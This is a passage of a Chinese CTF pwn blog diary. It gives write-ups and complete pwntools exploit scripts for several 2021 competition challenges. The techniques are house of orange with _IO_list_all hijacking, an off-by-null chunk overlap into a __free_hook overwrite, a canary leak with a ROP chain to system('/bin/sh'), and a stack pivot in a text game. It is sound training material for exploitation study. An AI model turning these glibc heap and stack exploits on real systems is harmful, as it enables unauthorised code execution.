<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>                          <span class="comment"># padding</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)          <span class="comment"># _IO_OVERFLOW arg  + unsorted bin size</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)      <span class="comment"># 劫持_IO_list_all</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)                     <span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)       <span class="comment"># small bin[4] ending</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x548</span>) <span class="comment"># heap_base + 0x548 相当于是 vtable-&gt;__overflow</span></span><br><span class="line"><span class="comment">#payload1 += p64(0)*2</span></span><br><span class="line">payload1 += p64(system_addr)                  <span class="comment"># __overflow</span></span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>这里值得说一下的是<code>heap_base + 0x548</code>的这个点，这个0x548是通过动态调试计算出来的，一般等于你当前<code>_chain</code>指向的的地址+0xc0，最终目的是将<code>__overflow</code>覆盖成<code>system</code></p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/48.png" alt="pic"></p>
<h4 id="完整exp-6"><a href="#完整exp-6" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;47.108.195.119&quot;,20141)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Name?&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;请输入你的队伍名称:&quot;)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;haruki&quot;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;请输入你的id或名字:&quot;)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;haruki&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+ <span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x3b7a63</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x548</span>)</span><br><span class="line"><span class="comment">#payload1 += p64(0)*2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#add(0)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size of it&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&quot;0x20&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>由于house_of_orange的利用方式不是很稳定所以可能要多试几次才能getshell。</p>
<h2 id="2021-11-29"><a href="#2021-11-29" class="headerlink" title="2021-11-29"></a>2021-11-29</h2><p>本周由于考试以及一些其它相关的杂事会停止更新下周一继续。</p>
<h2 id="2021-11-30"><a href="#2021-11-30" class="headerlink" title="2021-11-30"></a>2021-11-30</h2><h3 id="2021-安洵杯-noleak1"><a href="#2021-安洵杯-noleak1" class="headerlink" title="[2021 安洵杯]noleak1"></a>[2021 安洵杯]noleak1</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/noleak.zip">附件</a></p>
<p>虽然这周实验拉满，还要复习考试，但感觉一天不做题还是有点空虚，这里就写一简单的off by null(比赛中没看出来off by null还是太菜)</p>
<h4 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h4><p>secert函数</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/49.png" alt="pic"></p>
<p>开局要先过一个加密函数，经逆向👴分析是个栅栏，解密得<code>N0_py_1n_tHe_ct7</code></p>
<p>过了scerte之后就可以进入菜单了。</p>
<p>add函数中并没有限制申请堆块的大小，所以我们可以将一个大于0x420(tcache max)chunk释放进unsorted bin，再申请一个块然后通过残留的指针来泄露出libc</p>
<p>当时做到这里的时候我就卡住了，当时的思路是想这找一个地方去劫持free_hook的，但是没找到，赛后看wp才知道是off by null去实现chunk overlap。其实以前也做过相似的题，比赛的时候还是没有想到那个地方去，还是思考的少了。。。</p>
<p>关于off by null的具体原理以及分析可以看这篇<a href="https://www.anquanke.com/post/id/208407">博客</a>, 由于是wp所以不会讲太多的原理，只会讲一些具体的利用。</p>
<p>这里了我们构造3个chunk,3个chunk满足以下条件：</p>
<pre><code>chunk1:size要大于tcache max也就是要大于0x420，这里是为了防止构造的chunk进入tcache而无法合并，如果限制了chunk的大小，那么一定要先填满tcache
chunk2:size要等于0xk8这里涉及到Glibc堆管理机制中空间复用,且为了方便后面tcache去劫持free_hook其他小不能大于tcache max
chunk3:要保证其的size域一定要是0x100的整倍数，且大小大于tcache max
</code></pre><p>先释放掉<code>chunk1</code>,接下来，我们通过修改<code>chunk3</code>的<code>p_size</code>为<code>chunk1+chunk2</code>就使得<code>chunk1</code>,<code>chunk2</code>合并,然后再将<code>chunk2</code>释放进<code>unsorted bin</code>中合并。此时的<code>chunk2</code>处于释放状态，而我们仍然可控。接下来我们只需要将<code>chunk2</code>再申请出来就能达到<code>overlap</code>的效果,接下来劫持<code>free_hook</code>对我们来说就轻而易举了。</p>
<h4 id="解题步骤-5"><a href="#解题步骤-5" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="Step1-secert"><a href="#Step1-secert" class="headerlink" title="Step1 secert"></a>Step1 secert</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;N0_py_1n_tHe_ct7&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step2-leak"><a href="#Step2-leak" class="headerlink" title="Step2 leak"></a>Step2 leak</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>) <span class="comment">#防止合并</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#edit(0,p64(0))</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="Step3-overlap"><a href="#Step3-overlap" class="headerlink" title="Step3 overlap"></a>Step3 overlap</h5><p>在这之前要先把unsorted bin清空<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x3e0</span>)  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0x420</span> + <span class="number">0x10</span> + <span class="number">0x70</span> + <span class="number">0x10</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure></p>
<h5 id="劫持free-hook"><a href="#劫持free-hook" class="headerlink" title="劫持free_hook"></a>劫持free_hook</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<h4 id="完整exp-7"><a href="#完整exp-7" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;noleak1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;N0_py_1n_tHe_ct7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index?&quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#edit(0,p64(0))</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3e0</span>)  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0x420</span> + <span class="number">0x10</span> + <span class="number">0x70</span> + <span class="number">0x10</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-12-09"><a href="#2021-12-09" class="headerlink" title="2021-12-09"></a>2021-12-09</h2><h3 id="2021-西湖论剑-string-go"><a href="#2021-西湖论剑-string-go" class="headerlink" title="[2021 西湖论剑] string_go"></a>[2021 西湖论剑] string_go</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/string_go">附件</a> 本地用的ubuntu版本为ubuntu18 11.4</p>
<p>这道题其实是一道很简单的题，只是我当时比赛的时候看到c++就开摆，导致这个题没出，还是自己态度的问题吧，经过这次比赛涨了个教训。</p>
<h4 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h4><p>由于自己没有学过c++，所以IDA反汇编出来那一大串不是看的很懂，所以分析程序的时候就是一顿连蒙带猜</p>
<p>首先看主函数<br><img src="https://gitee.com/Nss-harukii/images/raw/master/56.png" alt="pic"></p>
<p>menu 会打印一个这样的菜单</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/57.png" alt="pic"></p>
<p>然后python_input函数会获取我们第一次的输入</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/58.png" alt="pic"></p>
<p>然后是calc ,这个函数我没怎么看懂，但感觉是一个检查输入合法性的函数，赛后看大佬们的wp感觉应该是一个处理算式的函数，然后将计算的结果返回，如果返回值为3则进入接下来的判断</p>
<p>接下来会进入lative_func函数，听名字应该就是个有洞的函数，但是由于不太看的懂到这里基本都靠猜了<br><img src="https://gitee.com/Nss-harukii/images/raw/master/59.png" alt="pic"></p>
<p>首先，先输入v7的值，这里要求v7小于等于7，由于v7是int型所以输入负数也可以通过判断，</p>
<p>接下来输入v10然后是<code>v2 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](v10, v7)</code>这句话的意思是将v2赋值为v10的第v7个值</p>
<p>以下是靠猜测 : 这里的v7会被当作一个无符号整数而导致溢出，然后在打印v10的时候会将栈中的东西leak出来，然后这里可以leak出libc和canary（偏移动态调试得到）</p>
<p>接下来输入v9,直接溢出来rop这里需要注意的就是要动态调试计算一下溢出后到ret的距离</p>
<h4 id="完整exp-8"><a href="#完整exp-8" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;string_go&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x61b800</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv(<span class="number">0x12</span>)</span><br><span class="line">canary =u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#print(canary)</span></span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;bbbbbbbb&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#p.sendline(&quot;bbbbbbbbb&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/60.png" alt="pic"></p>
<h2 id="2021-12-10"><a href="#2021-12-10" class="headerlink" title="2021-12-10"></a>2021-12-10</h2><h3 id="湖湘杯2021-2021-Game"><a href="#湖湘杯2021-2021-Game" class="headerlink" title="[湖湘杯2021 2021]Game"></a>[湖湘杯2021 2021]Game</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/game">附件</a></p>
<p>这道题的利用方式比较简单，难就难在找出利用点，这道题也比较适合逆向新手来练习逆向</p>
<h4 id="题目分析-9"><a href="#题目分析-9" class="headerlink" title="题目分析"></a>题目分析</h4><p>这道题是个游戏题，还有点意思，主要讲的是主角作为人造人被人类观察做实验，还有好几个结局，在玩的时候发现输入密码的时候有奇怪的字符串输出</p>
<p>判断这里应该是个溢出点</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/61.png" alt="pic"></p>
<p>然后发现这里之后如果输错密码会remake到第一次输密码的地方</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/62.png" alt="pic"></p>
<p>进入IDA发现输入我们名字的地方会将我们的输入读入bss段</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/65.png" alt="pic"></p>
<p>之后分析发现输密码的地方只溢出了八个字节,虽然可以反复利用但是我没想到啥利用方法，感觉只能用来泄露canary</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/63.png" alt="pic"></p>
<p>继续分析发现这里溢出了0x10字节,可以用来做栈迁移，但是之前玩游戏的时候没有发现这条分支，经过Ctrl+x追踪发现只要在出牢房后的所有有选择的地方选择3隐藏选项就能进入该分支</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/64.png" alt="pic"></p>
<h4 id="完整exp-9"><a href="#完整exp-9" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;game&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;game&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28039)</span></span><br><span class="line">ls = <span class="number">0x0000401256</span></span><br><span class="line">name = <span class="number">0x0000000004080C0</span></span><br><span class="line">system = <span class="number">0x401265</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000402bb3</span></span><br><span class="line">leave_ret = <span class="number">0x401337</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x600</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rdi) + p64(name + <span class="number">0x600</span>) + p64(system)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;开始游戏&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入你的名字：&quot;</span>,payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.女&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.打开柜子&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;这个柜子看起来十分笨重难以打开。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;然而她还是尝试打开它。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;直接打开了柜子。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.无视提醒打开它&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;那么就由我来告诉你一些事情吧。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;我们所有人都在寻找出路&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;你可能就会想起我们又一次越狱失败了。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;你就会记起一切。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;我把线索藏在了你自己的衣服里。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;来......&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;你真的相信它所写的那些事情吗？）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;床上发呆。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;开始研究起来。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;你为什么会相信？）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.气恼地撕开衣服&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;分布着星星和横杠。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;,-****&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;8位数字密码：&quot;</span>,<span class="string">&quot;20161226&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;上的地方。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;发出了声响。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;个密码锁。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;密码:&quot;</span>,payload2)</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffffff00</span></span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;开了房间门。&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;么也没有。)&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;么知道的！）&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;打开了它。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;动了起来。&quot;</span>,<span 